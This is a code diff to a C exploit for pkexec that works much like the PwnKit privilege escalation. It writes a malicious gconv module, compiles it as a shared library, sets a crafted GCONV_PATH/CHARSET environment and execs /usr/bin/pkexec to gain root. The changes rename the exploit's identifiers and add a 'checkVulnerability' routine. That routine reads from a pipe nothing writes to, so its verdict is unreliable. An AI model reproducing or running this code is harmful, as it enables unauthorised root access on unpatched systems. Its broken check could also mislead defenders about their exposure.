@@ -5,13 +5,14 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <fcntl.h>
-
+#include <sys/wait.h>
 struct stat st;
-
+    int pipefd[2];
+    char buf[99999];
 void compileExploit()
 {
 	FILE *fp;
-	fp = fopen("pwnkit/pwnkit.c", "w");
+	fp = fopen("exploit/exploit.c", "w");
 	if (fp < 0) {
                 perror("fopen");
 		exit(0);
@@ -32,7 +33,7 @@ void compileExploit()
 
 	fprintf(fp, "%s", shell);
 	fclose(fp);
-	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
+	system("gcc exploit/exploit.c -o exploit/exploit.so -shared -fPIC");
 }
 
 void gconvpath()
@@ -42,7 +43,7 @@ void gconvpath()
                 perror("mkdir");
 		exit(0);
             }
-        int fd = open("GCONV_PATH=./pwnkit", O_CREAT|O_RDWR, 0777);
+        int fd = open("GCONV_PATH=./exploit", O_CREAT|O_RDWR, 0777);
             if (fd < 0) {
                 perror("open");
 		exit(0);
@@ -53,32 +54,52 @@ void gconvpath()
 
 void iconv_open()
 {
-	if (stat("pwnkit", &st) < 0) {
-            if(mkdir("pwnkit", 0777) < 0) {
+	if (stat("exploit", &st) < 0) {
+            if(mkdir("exploit", 0777) < 0) {
                 perror("mkdir");
 		exit(0);
         }
 
-        FILE *fp = fopen("pwnkit/gconv-modules", "wb");
+        FILE *fp = fopen("exploit/gconv-modules", "wb");
         if(fp == NULL) {
             perror("fopen");
 	    exit(0);
         }
-        fprintf(fp, "module UTF-8// PWNKIT// pwnkit 2\n");
+        fprintf(fp, "module UTF-8// NOT_UTF8// exploit 2\n");
         fclose(fp);
     	}
+}
+
+void checkVulnerability()
+{
+    pipe(pipefd);
+    if (fork() == 0)
+    {
+        close(pipefd[1]);
+        read(pipefd[0], buf, sizeof(buf)-1);
+	close(pipefd[0]);
+        if (strstr(buf, "pkexec --version") == buf) {
+            puts("System is not vulnerable");
+	    exit(0);
+        }else{
+	    puts("System vulnerable");
+	}
+	
+        exit(0);
+    }
+    close(pipefd[0]);
+    close(pipefd[1]);
 }
 
 int main(int argc, char *argv[]) {
 	FILE *fp;
 
 	char * a_argv[]={ NULL };
-
     	char * a_envp[]={
-        	"pwnkit", 
+            "exploit", 
 	    "PATH=GCONV_PATH=.", 
-	    "CHARSET=PWNKIT", 
-	    "SHELL=pwnkit", 
+	    "CHARSET=NOT_UTF8", 
+	    "SHELL=not/in/etc/shells", 
 	    NULL
     	};
 
@@ -87,6 +108,8 @@ int main(int argc, char *argv[]) {
 	iconv_open();
 
 	compileExploit();
+
+	checkVulnerability();
 
 	execve("/usr/bin/pkexec", a_argv, a_envp);
 }
